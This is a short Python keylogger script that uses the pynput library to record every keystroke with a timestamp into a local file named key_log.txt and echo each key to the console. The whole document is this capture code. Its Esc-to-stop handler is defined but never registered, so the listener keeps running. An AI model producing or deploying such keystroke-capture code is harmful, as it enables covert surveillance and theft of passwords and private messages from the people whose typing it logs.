from pynput.keyboard import Key, Listener
from pynput import keyboard
import logging, os

# Abrir atual diretório
os.chdir(os.path.dirname(os.path.abspath(__file__)))

log_dir = ""

logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctime)s:%(message)s')

def on_press(Key):
    logging.info(str(Key))
    print('{0}'.format(Key))

def on_release(key):
    #print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press) as listener:
    listener.join()